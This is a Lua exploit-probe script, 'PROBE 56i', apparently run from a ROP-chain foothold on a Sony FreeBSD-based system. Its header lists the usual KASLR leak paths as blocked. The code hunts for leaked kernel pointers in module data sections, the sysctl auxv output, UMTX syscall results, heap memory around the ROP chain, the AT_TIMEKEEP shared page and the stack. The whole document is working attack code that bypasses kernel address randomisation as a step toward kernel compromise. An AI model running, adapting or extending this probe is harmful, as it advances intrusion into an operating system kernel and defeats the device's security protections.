-- CRASH_CLASS: LOW
-- PROBE 56i: Unconventional KASLR — scan everywhere for kernel pointers
--
-- Context: ALL standard KASLR paths are dead on 14.10:
--   kldstat(308) lethal, kldfirstmod(309) lethal, kldnext(304) lethal
--   modfnext/modfind/modstat all ret=-1
--   AF_ROUTE sanitized, RDMSR blocked, kinfo_proc clean, VM map clean
--
-- This probe scans unconventional locations:
--   [A] Stack bottom / auxv — kernel writes auxiliary vector during exec
--   [B] All 39 module data sections — scan for kernel pointers in globals
--   [C] UMTX operations — futex wait channels may leak kernel addresses
--   [D] sysctl kern.proc.auxv — explicit auxv query
--   [E] Heap near ROP chain — scan loader internals for stale kernel ptrs
--   [F] sigaltstack frame — signal delivery writes kernel-derived data

print("=== PROBE 56i: UNCONVENTIONAL KASLR HUNT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

local function get_module_info(handle)
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc = make_syscall(593)
    local ok = pcall(function() sc(uint64(handle), info) end)
    if not ok then return nil end
    local text_lo = safe_rd(info + 0x108)
    local text_hi = safe_rd(info + 0x10C)
    local text_sz_lo = safe_rd(info + 0x110)
    local data_lo = safe_rd(info + 0x148)
    local data_hi = safe_rd(info + 0x14C)
    local data_sz_lo = safe_rd(info + 0x150)
    return {
        text_lo = text_lo or 0, text_hi = text_hi or 0,
        text_sz_lo = text_sz_lo or 0,
        data_lo = data_lo or 0, data_hi = data_hi or 0,
        data_sz_lo = data_sz_lo or 0,
    }
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- ============================================================
-- [B] Scan all module DATA sections for kernel pointers
-- 39 modules via dynlib_get_info(593), data base at +0x148
-- ============================================================
print("")
print("[B] Module data section scan (39 modules)")

local kptrs_found = 0
local handles = {0, 0x1, 0x2, 0x2001, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
    0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20,
    0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A,
    0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33}

local scanned_modules = 0
for _, handle in ipairs(handles) do
    local mi = get_module_info(handle)
    if mi and mi.data_lo ~= 0 and mi.data_sz_lo > 0 then
        scanned_modules = scanned_modules + 1
        local scan_sz = mi.data_sz_lo
        if scan_sz > 0x10000 then scan_sz = 0x10000 end

        local data_addr = uint64(string.format("0x%X%08X", mi.data_hi, mi.data_lo))
        local found_in_mod = 0

        for off = 0, scan_sz - 8, 8 do
            local dh = mi.data_hi
            local dl = mi.data_lo + off
            if dl >= 0x100000000 then
                dh = dh + 1
                dl = dl - 0x100000000
            end
            local addr = uint64(string.format("0x%X%08X", dh, dl))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                kptrs_found = kptrs_found + 1
                found_in_mod = found_in_mod + 1
                if kptrs_found <= 20 then
                    print(string.format("  *** handle=0x%X data+0x%X: %s KERNEL PTR!",
                        handle, off, hexval(val)))
                end
            end
        end

        if found_in_mod > 0 then
            print(string.format("  handle 0x%X: %d kernel pointers in data section!",
                handle, found_in_mod))
        end
    end
end
print(string.format("  Scanned %d modules, found %d kernel pointers", scanned_modules, kptrs_found))

-- ============================================================
-- [C] sysctl kern.proc.auxv — MIB {1, 14, 16, pid}
-- auxv contains AT_* entries written by kernel during execve
-- AT_ENTRY, AT_PHDR, AT_BASE are userland, but there might be
-- Sony-specific or FreeBSD-specific entries with kernel data
-- ============================================================
print("")
print("[C] sysctl kern.proc.auxv")

local sc_sysctl = make_syscall(202)
local mib = memory.alloc(24)
safe_wd(mib, 1)        -- CTL_KERN
safe_wd(mib + 4, 14)   -- KERN_PROC
safe_wd(mib + 8, 16)   -- KERN_PROC_AUXV
safe_wd(mib + 12, our_pid)

local auxbuf = memory.alloc(0x800)
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)

local ok, ret = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(auxbuf),
        uint64(oldlenp), uint64(0), uint64(0))
end)
local r = -999
if ok then r = to_num(ret) end

if r == 0 then
    local auxlen = safe_rd(oldlenp) or 0
    print(string.format("  auxv ret=0, len=%d bytes", auxlen))

    -- Each Elf_Auxinfo is 16 bytes: { long a_type; union { long a_val; void *a_ptr; } }
    local i = 0
    while i < auxlen and i < 0x800 do
        local atype = safe_rq(auxbuf + i)
        local aval = safe_rq(auxbuf + i + 8)
        if atype == nil then break end

        local at = to_num(atype)
        if at == 0 then break end -- AT_NULL

        local vh, vl = get_hi_lo(aval)
        local tag = ""
        if at == 3 then tag = " (AT_PHDR)"
        elseif at == 4 then tag = " (AT_PHENT)"
        elseif at == 5 then tag = " (AT_PHNUM)"
        elseif at == 6 then tag = " (AT_PAGESZ)"
        elseif at == 7 then tag = " (AT_BASE)"
        elseif at == 8 then tag = " (AT_FLAGS)"
        elseif at == 9 then tag = " (AT_ENTRY)"
        elseif at == 15 then tag = " (AT_EXECPATH)"
        elseif at == 16 then tag = " (AT_CANARY)"
        elseif at == 17 then tag = " (AT_CANARYLEN)"
        elseif at == 18 then tag = " (AT_OSRELDATE)"
        elseif at == 19 then tag = " (AT_NCPUS)"
        elseif at == 20 then tag = " (AT_PAGESIZES)"
        elseif at == 21 then tag = " (AT_PAGESIZESLEN)"
        elseif at == 22 then tag = " (AT_TIMEKEEP)"
        elseif at == 23 then tag = " (AT_STACKPROT)"
        elseif at == 24 then tag = " (AT_EHDRFLAGS)"
        elseif at == 25 then tag = " (AT_HWCAP)"
        elseif at == 26 then tag = " (AT_HWCAP2)"
        end

        print(string.format("  type=%d%s val=%s", at, tag, hexval(aval)))

        if is_kptr(aval) then
            print("    ^^^ KERNEL POINTER!")
        end

        i = i + 16
    end
else
    print(string.format("  auxv ret=%d", r))

    -- Try alternate MIB: {1, 14, 16, pid, 0x800}
    safe_wd(mib + 16, 0x800)
    safe_wd(oldlenp, 0x800)
    safe_wd(oldlenp + 4, 0)
    ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(5), uint64(auxbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    r = -999
    if ok then r = to_num(ret) end
    print(string.format("  auxv (5-element MIB) ret=%d", r))
end

-- ============================================================
-- [D] UMTX operations — futex-style ops may leak kernel addresses
-- sys 454 = _umtx_op(void *obj, int op, u_long val, void *uaddr1, void *uaddr2)
-- ops: UMTX_OP_WAIT=2, UMTX_OP_WAKE=3, UMTX_OP_MUTEX_TRYLOCK=5,
--      UMTX_OP_NWAKE_PRIVATE=21
-- On error, kernel may write wait-channel or internal state to output args
-- ============================================================
print("")
print("[D] UMTX operations — check for kernel address leaks")

local sc_umtx = make_syscall(454)
local umtx_obj = memory.alloc(0x100)
local umtx_out1 = memory.alloc(0x100)
local umtx_out2 = memory.alloc(0x100)

-- Zero all buffers
for i = 0, 0xFF, 4 do
    safe_wd(umtx_obj + i, 0)
    safe_wd(umtx_out1 + i, 0)
    safe_wd(umtx_out2 + i, 0)
end

-- UMTX_OP_MUTEX_TRYLOCK = 5
safe_wd(umtx_obj, 0)  -- unowned mutex
local ok2, ret2 = pcall(function()
    return sc_umtx(uint64(umtx_obj), uint64(5), uint64(0),
        uint64(umtx_out1), uint64(umtx_out2))
end)
local ur = ok2 and to_num(ret2) or -999
print(string.format("  UMTX_OP_MUTEX_TRYLOCK ret=%d", ur))
-- Check if kernel wrote anything
for off = 0, 0x3F, 8 do
    local v1 = safe_rq(umtx_out1 + off)
    local v2 = safe_rq(umtx_out2 + off)
    if v1 and is_kptr(v1) then
        print(string.format("    out1+0x%02X: %s KERNEL PTR!", off, hexval(v1)))
    end
    if v2 and is_kptr(v2) then
        print(string.format("    out2+0x%02X: %s KERNEL PTR!", off, hexval(v2)))
    end
end

-- UMTX_OP_SEM2_WAIT = 25 (may write kernel wait info)
for i = 0, 0xFF, 4 do
    safe_wd(umtx_out1 + i, 0)
    safe_wd(umtx_out2 + i, 0)
end
safe_wd(umtx_obj, 1)  -- sem count = 1
local ok3, ret3 = pcall(function()
    return sc_umtx(uint64(umtx_obj), uint64(25), uint64(0),
        uint64(umtx_out1), uint64(umtx_out2))
end)
local ur3 = ok3 and to_num(ret3) or -999
print(string.format("  UMTX_OP_SEM2_WAIT ret=%d", ur3))
for off = 0, 0x3F, 8 do
    local v = safe_rq(umtx_out1 + off)
    if v and is_kptr(v) then
        print(string.format("    out1+0x%02X: %s KERNEL PTR!", off, hexval(v)))
    end
end

-- UMTX_OP_ROBUST_LISTS = 22 (robust futex, may set kernel fields)
for i = 0, 0xFF, 4 do safe_wd(umtx_out1 + i, 0) end
-- Set up a robust list head structure
safe_wq(umtx_obj, uint64(0))          -- list head
safe_wq(umtx_obj + 8, uint64(0))      -- pending
safe_wd(umtx_obj + 16, 0)             -- offset
local ok4, ret4 = pcall(function()
    return sc_umtx(uint64(umtx_obj), uint64(22), uint64(24),
        uint64(0), uint64(0))
end)
local ur4 = ok4 and to_num(ret4) or -999
print(string.format("  UMTX_OP_ROBUST_LISTS ret=%d", ur4))

-- ============================================================
-- [E] Heap scan near ROP chain for kernel pointers
-- The loader's internal structures are near the ropchain.
-- Scan +-0x4000 bytes around it.
-- ============================================================
print("")
print("[E] Heap scan near ROP chain")

local pipe_str = tostring(syscall.pipe)
local rop_addr_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
if rop_addr_str then
    local rop_addr = uint64(rop_addr_str)
    local rh, rl = get_hi_lo(rop_addr)
    print("  ropchain: " .. hexval(rop_addr))

    local heap_kptrs = 0
    -- Scan ropchain - 0x4000 to ropchain + 0x8000
    for off = -0x4000, 0x8000, 8 do
        local scan_l = rl + off
        local scan_h = rh
        if scan_l < 0 then
            scan_h = scan_h - 1
            scan_l = scan_l + 0x100000000
        elseif scan_l >= 0x100000000 then
            scan_h = scan_h + 1
            scan_l = scan_l - 0x100000000
        end
        if scan_h >= 0 then
            local addr = uint64(string.format("0x%X%08X", scan_h, scan_l))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                heap_kptrs = heap_kptrs + 1
                if heap_kptrs <= 10 then
                    print(string.format("  rop%+05X: %s KERNEL PTR!",
                        off, hexval(val)))
                end
            end
        end
    end
    print(string.format("  Scanned 0xC000 bytes, found %d kernel pointers", heap_kptrs))
end

-- ============================================================
-- [F] AT_TIMEKEEP shared page — kernel maps a page with timing data
-- On FreeBSD, AT_TIMEKEEP points to struct vdso_timehands
-- which the kernel updates. The page itself is kernel-mapped
-- but readable from userland. Its CONTENTS might have kernel ptrs.
-- ============================================================
print("")
print("[F] Check AT_TIMEKEEP / shared page contents")

-- Re-read auxv if we got it
if r == 0 then
    local i = 0
    while i < 0x800 do
        local atype = safe_rq(auxbuf + i)
        local aval = safe_rq(auxbuf + i + 8)
        if atype == nil then break end
        local at = to_num(atype)
        if at == 0 then break end
        if at == 22 then -- AT_TIMEKEEP
            print("  AT_TIMEKEEP addr: " .. hexval(aval))
            -- Scan this page for kernel pointers
            local th, tl = get_hi_lo(aval)
            if tl ~= 0 or th ~= 0 then
                local tk_kptrs = 0
                for off = 0, 0x3FF0, 8 do
                    local scan_l = tl + off
                    local scan_h = th
                    if scan_l >= 0x100000000 then
                        scan_h = scan_h + 1
                        scan_l = scan_l - 0x100000000
                    end
                    local addr = uint64(string.format("0x%X%08X", scan_h, scan_l))
                    local val = safe_rq(addr)
                    if val and is_kptr(val) then
                        tk_kptrs = tk_kptrs + 1
                        print(string.format("    timekeep+0x%04X: %s KERNEL PTR!", off, hexval(val)))
                    end
                end
                print(string.format("    Scanned 0x4000 bytes, %d kernel pointers", tk_kptrs))
            end
        end
        i = i + 16
    end
end

-- ============================================================
-- [G] Stack region scan — find stack from VM map, scan for kernel ptrs
-- Use sys 674 to find the stack region, then scan it
-- ============================================================
print("")
print("[G] Stack region scan via sys 674")

local sc_vmmap = make_syscall(674)
local vm_buf = memory.alloc(0x8000)
local vm_len_buf = memory.alloc(8)
safe_wd(vm_len_buf, 0x8000)
safe_wd(vm_len_buf + 4, 0)

local ok5, ret5 = pcall(function()
    return sc_vmmap(uint64(vm_buf), uint64(vm_len_buf))
end)
local vr = ok5 and to_num(ret5) or -999

if vr == 0 then
    local vm_len = safe_rd(vm_len_buf) or 0
    local entries = math.floor(vm_len / 72)
    print(string.format("  VM map: %d bytes, %d entries", vm_len, entries))

    -- Find stack region (typically highest user VA, prot=0x33 RW)
    local stack_start_h, stack_start_l = 0, 0
    local stack_end_h, stack_end_l = 0, 0
    for e = 0, entries - 1 do
        local base = vm_buf + e * 72
        local start_val = safe_rq(base)
        local end_val = safe_rq(base + 8)
        local prot = safe_rd(base + 0x18) or 0
        -- Stack is usually the highest RW region with name containing "stack"
        -- or at high VA. Read name at +0x20
        local name = ""
        for ci = 0, 15 do
            local b = safe_rd(base + 0x20 + ci)
            if b and b > 0 and b < 128 then
                name = name .. string.char(b)
            end
        end
        if name:find("stack") then
            local sh, sl = get_hi_lo(start_val)
            local eh, el = get_hi_lo(end_val)
            stack_start_h = sh
            stack_start_l = sl
            stack_end_h = eh
            stack_end_l = el
            print(string.format("  Found stack: %s - %s prot=0x%X",
                hexval(start_val), hexval(end_val), prot))
        end
    end

    if stack_start_l ~= 0 or stack_start_h ~= 0 then
        -- Scan last 0x2000 bytes of stack (top, most recent frames)
        local scan_start_l = stack_end_l - 0x2000
        local scan_start_h = stack_end_h
        if scan_start_l < 0 then
            scan_start_h = scan_start_h - 1
            scan_start_l = scan_start_l + 0x100000000
        end

        local stack_kptrs = 0
        for off = 0, 0x1FF8, 8 do
            local sl = scan_start_l + off
            local sh = scan_start_h
            if sl >= 0x100000000 then
                sh = sh + 1
                sl = sl - 0x100000000
            end
            local addr = uint64(string.format("0x%X%08X", sh, sl))
            local val = safe_rq(addr)
            if val and is_kptr(val) then
                stack_kptrs = stack_kptrs + 1
                if stack_kptrs <= 10 then
                    print(string.format("    stack end-%04X: %s KERNEL PTR!",
                        0x2000 - off, hexval(val)))
                end
            end
        end
        print(string.format("  Scanned 0x2000 stack bytes, %d kernel pointers", stack_kptrs))
    else
        print("  Stack region not found in VM map")
    end
else
    print(string.format("  VM map ret=%d", vr))
end

collectgarbage("restart")

print("")
print("=== PROBE 56i COMPLETE ===")
